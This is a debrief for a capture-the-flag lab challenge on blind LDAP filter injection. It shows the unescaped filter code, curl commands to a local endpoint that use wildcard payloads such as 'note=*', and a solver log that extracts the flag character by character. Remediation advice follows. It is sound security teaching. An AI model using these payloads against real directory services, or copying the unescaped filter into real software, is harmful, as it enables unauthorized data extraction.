# The Silent Directory, Debrief

**Node:** `p4_6` &middot; **Flag:** `SEIYAKU{silence_still_answers}` &middot; **Route:** `POST /p4/registrar/verify` &middot; **Sink:** `challenges/phase4.py`, real OpenLDAP (`ou=registrar,dc=hunterassoc,dc=org`) via `core/db.py`'s `ldap_conn()` &middot; **Signal:** strictly boolean (`verified: true/false`, never attributes)

New to LDAP basics, the filter grammar, or RFC 4515's metacharacters?
Read `phase4/zodiac-breach/DEBRIEF.md`'s "LDAP basics, briefly" section
first, this floor assumes it and focuses on what's different here: blind
extraction against an oracle with no dump-mode fallback.

## Root cause

Same bug class as `p4_5`'s Zodiac Breach: `uid` and `note` are spliced
directly into a real LDAP search filter via raw string concatenation,
zero RFC 4515 escaping:

```python
# challenges/phase4.py
ldap_filter = f"(&(uid={uid})(description={note}))"
entries, error = _registrar_search(ldap_filter)
verified = len(entries) == 1
```

An ordinary `uid`/`note` pair with no filter metacharacters produces an
ordinary two-clause `AND` that can only ever be true if both values are
exactly, literally correct. The bug is what either field can become once
it contains `(`, `)`, or `*`.

## Why `p4_5`'s shortcut doesn't work here

Zodiac Breach's fastest path isn't blind extraction at all, it's
widening a filter until it matches *more than one* entry, which flips
that floor's own route into a raw-dump mode that reveals every matched
entry's full attributes, `description` included. That shortcut depends
entirely on the response shape offering a richer mode to fall into.

This floor's route never does that. `verified` is a single boolean,
computed from `len(entries) == 1`, and the response is **exactly**
`{"verified": true/false}`, full stop, no matter how many entries a
widened filter actually matches, no matter what those entries contain.
There is no dump mode to unlock here. The only information that ever
reaches the caller is whether exactly one entry satisfied the filter,
which means the only technique available is the blind, char-by-char
substring walk `p4_5`'s own debrief mentions but doesn't need.

## The technique: substring filters against a yes/no oracle

RFC 4515's wildcard behavior, already introduced in `p4_5`'s debrief, is
the whole mechanism:

- `(description=*)`, a bare `*` as an entire value, is a **presence**
  assertion: true if the attribute exists at all, regardless of its
  real value.
- `(description=SEIYAKU{*)`, a partial value with a trailing `*`, is a
  **prefix** assertion: true only if the real value actually starts with
  that literal text.

Verified live against this exact seed:

```bash
curl -s -X POST http://localhost:8000/p4/registrar/verify -H "Accept: application/json" \
    -d "uid=keeper" --data-urlencode "note=*"
# {"error":null,"verified":true}   <- keeper has SOME description

curl -s -X POST http://localhost:8000/p4/registrar/verify -H "Accept: application/json" \
    -d "uid=keeper" --data-urlencode "note=SEIY*"
# {"error":null,"verified":true}   <- it starts with "SEIY"

curl -s -X POST http://localhost:8000/p4/registrar/verify -H "Accept: application/json" \
    -d "uid=keeper" --data-urlencode "note=ZZZZ*"
# {"error":null,"verified":false}  <- it does not start with "ZZZZ"
```

Grow a confirmed prefix one character at a time: for each candidate next
character, send `note=<known><candidate>*` and keep whichever candidate
verifies true. Repeat until a fresh candidate stops matching anything,
exactly the same shape as p4_3's Records Room `$regex` walk, just
expressed in LDAP's filter grammar instead of MongoDB's query language.

## A genuine LDAP nuance this floor surfaces: case-insensitive matching

`description`'s attribute syntax (RFC 4517, `DirectoryString`) uses
`caseIgnoreMatch`/`caseIgnoreSubstringsMatch` as its default matching
rules in OpenLDAP. Verified live:

```bash
curl ... -d "uid=keeper" --data-urlencode "note=seiyaku{s*"
# {"verified":true}
curl ... -d "uid=keeper" --data-urlencode "note=SEIYAKU{S*"
# {"verified":true}
```

Both verify true against the same entry. **The oracle genuinely cannot
distinguish 'S' from 's'.** This isn't a solver bug, it's real,
documented LDAP behavior, and it's exactly the kind of thing a
real-world blind-extraction engagement runs into: not every oracle can
resolve every bit of information you'd like it to.

`solvers/p4_6.sh` resolves this the way a real tester would: by applying
external knowledge rather than asking the oracle to do something it
provably can't. This lab's own flag format is fixed and
publicly documented (`SEIYAKU{lowercase_snake_words}`, the body is
always lowercase), so the solver recovers the value case-insensitively
(an uppercase-only charset is enough, since case doesn't change what the
oracle reports) and then lowercases everything between `{` and `}`
before the final comparison. A real engagement without that convenient
convention would need a different external signal, a case-SENSITIVE
matching rule on a *different* attribute to cross-check against,
timing nuances, or simply reporting the limitation honestly rather than
guessing.

## The walk, live

```
solvers/p4_6.sh runs against this exact seed:

[p4_6] step 1: ordinary verify with a wrong note (sanity check)
  ok: wrong note correctly reports verified:false
[p4_6] step 2: presence check, note=*
  ok: note=* reports verified:true, uid=keeper has a description attribute
[p4_6] step 3: blind substring walk of the description attribute
  [0] -> 'S'  (so far: 'S')
  [1] -> 'E'  (so far: 'SE')
  ...
  [29] -> '}'  (so far: 'SEIYAKU{SILENCE_STILL_ANSWERS}')
[p4_6] recovered value (case-insensitive oracle, raw): SEIYAKU{SILENCE_STILL_ANSWERS}
[p4_6] recovered value (case resolved via flag-format convention): SEIYAKU{silence_still_answers}
  ok: recovered flag matches: SEIYAKU{silence_still_answers}
[p4_6] PASS
```

## Isolation, and why this floor can't be solved through `p4_5`

This floor's seeded entry lives under a separate subtree,
`ou=registrar,dc=hunterassoc,dc=org`, not `ou=zodiac`. `p4_5`'s own
filter is hardcoded to search `ou=zodiac` only, so no matter how widened
that floor's own injection gets, it structurally cannot reach anything
under `ou=registrar`, verified live: `p4_5`'s full-roster dump lists
exactly the thirteen `ou=zodiac` entries (twelve committee members plus
`uid=chairman`), with `uid=keeper` never appearing. Two floors, same
underlying bug class, genuinely independent flags.

## HxH analogy

A desk that only ever says yes or no believes itself safe precisely
because of that restraint, nothing is ever shown, nothing is ever
printed, the record stays sealed no matter how the conversation goes.
But a room that answers truthfully to every question asked of it, even
when every individual answer is just one word, can still be made to
describe everything inside it, one careful question at a time. The
registrar was never going to open the door. The registrar also never
noticed that "is it this?" asked a few hundred times, patiently, in the
right order, doesn't need the door to open at all.

## Remediation

- **Escape every RFC 4515 metacharacter**, the same fix `p4_5`'s debrief
  already prescribes:

  ```python
  from ldap.filter import escape_filter_chars
  ldap_filter = f"(&(uid={escape_filter_chars(uid)})(description={escape_filter_chars(note)}))"
  ```

  After escaping, a `*` a caller submits becomes the literal text `\2a`,
  comparable only as inert data, never interpreted as a wildcard or
  presence assertion.

- **A strictly boolean response is not, on its own, a sufficient
  mitigation**, the headline lesson of this floor specifically: this
  route's design intent (reveal nothing but yes/no) was genuinely
  reasonable, and it was still fully exploitable, because the
  *underlying query* stayed unescaped. Minimizing what a response
  reveals reduces the speed of an attack, not whether one is possible.
  The fix has to be at the query-construction boundary, not the
  response shape.

- **Rate-limit or alert on repeated near-identical queries against a
  verification endpoint.** A blind walk of this kind produces a
  distinctive request pattern (hundreds of requests, each differing by
  one character), genuinely detectable at the network or application
  layer even when each individual response looks completely benign on
  its own.

- **Least-privilege service bind account**, same as every LDAP floor in
  this lab: the app's own bind should read only the attributes/subtree
  it actually needs.
